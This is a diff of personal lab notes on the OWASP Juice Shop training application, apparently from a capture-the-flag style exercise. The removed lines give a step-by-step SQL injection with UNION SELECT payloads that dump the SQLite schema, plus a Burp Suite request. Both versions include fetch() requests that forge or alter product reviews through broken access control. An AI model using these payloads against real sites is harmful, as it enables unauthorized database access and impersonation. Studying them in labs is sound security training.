@@ -65,71 +65,32 @@ Change bid value to say 1
 
 Change localhost
 
-Steps (made up):  
-Step 1: Identify the Entry Point  
-Target the product search functionality. The vulnerability lies in the q parameter processed by the backend API at /rest/products/search.
+Step : Identify the Entry Point and change the url with  the above one
 
-Step 2: Determine Query Structure  
-Inject characters to break the SQL statement. Testing reveals the backend query is closed using a closing quote and two parentheses.
 
-    Test Payload: qwert'))-- (Returns a successful response, confirming the injection context).
-
-Step 3: Enumerate Columns  
-Use a UNION SELECT statement to find the exact number of columns returned by the original query. Increment the numbers until the server returns a 200 OK status.
-
-    Test Payload: qwert')) UNION SELECT 1,2,3,4,5,6,7,8,9--
-
-    Result: The query requires exactly 9 columns.
-
-Step 4: Craft the Exploit  
-Juice Shop uses a SQLite database. Target the sqlite\_master metadata table and extract the sql column, which contains the table creation schemas.
-
-    Final Payload: qwert')) UNION SELECT sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite\_master--
-
-Step 5: Execute via Direct API Call  
-Navigate directly to the API endpoint in the browser to bypass the Angular frontend. The UI cannot render schema data as products, but querying the API directly reveals the raw JSON database schema.
-
-    Execution URL: http://localhost:3000/rest/products/search?q=qwert')) UNION SELECT sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite\_master--
-
-Step 6: url encoding performed to get pastable payload in browser \-\> cybershef / built in decoder
-
-Actual steps(burp suite):  
-[https://www.youtube.com/watch?v=nBF7YD\_H5CU](https://www.youtube.com/watch?v=nBF7YD_H5CU)
-
-Go to main page   
-Turn on intercept  
-Keep forwarding until get/rest/products/search?q= HTTP/1.1  
-Send to repeater  
-Change request to say get/rest/products/search?q=banana \-\> allows to see response has 9 fields per product   
-change to get/rest/products/search?q=banana’ \-\> SQLITE error observed \-\> db is sqlite and application crashed (vulnerable to sqli)  
-Change to   
-GET /rest/products/search?q=banana'))UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite\_master-- HTTP/1.1  
-Result obtained stop intercept , reload site
-
-explanation:  
-Escape sequence )) found based on previous response   
-UNION operator to stitch results  
-The UNION operator has one very strict rule: Both queries must return the exact same number of columns. Because the original product query returns 9 columns, your injected query must also ask for 9 columns, or the database will throw an error. You put the data you actually want in the first position (sql), and you fill the remaining 8 spots with junk numbers just to satisfy the database's structural requirements.  
-Every database engine has hidden system tables that keep track of how the database is built. In SQLite, this is always called sqlite\_master.
-
-The Data (sql): Inside sqlite\_master, there is a column specifically named sql. This column stores the raw text of the CREATE TABLE commands used to build the database, which reveals the entire schema.  
-\--): By adding two dashes at the end of your payload, you turn the rest of the developer's code into a comment. The database ignores it, preventing any final syntax errors from ruining your attack.
 
 **6\. Broken Access Control \- Submit a review attributed to a different user**
 
-Post a review open dev tools analyse the put request  
-Create a fetch request, changing author and message  
+Edit a comment inside the first product, keep network tab open and look for PUT or PATCH req method,
+copy the payload and put it into chatgpt or directly write the command below, replace url in this case
 Ex:
 
-fetch('http://localhost:3000/rest/products/6/reviews', {
-
-    method: 'PUT',
-
-    headers: { 'Content-Type': 'application/json' },
-
-    body: JSON.stringify({ author: "bender@juice-sh.op", message: "good" })
-
-});
+```
+fetch('http://localhost:3000/rest/products/1/reviews', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+    Authorization: `Bearer ${localStorage.token}`
+  },
+  body: JSON.stringify({
+    id: 'yCPfhWo5ZqzziuD9E',
+    message: 'hiii\n'
+  })
+})
+  .then(res => res.json())
+  .then(data => console.log(data))
+  .catch(err => console.error(err));
+  ```
 
 Replace localhost \-\> url
 
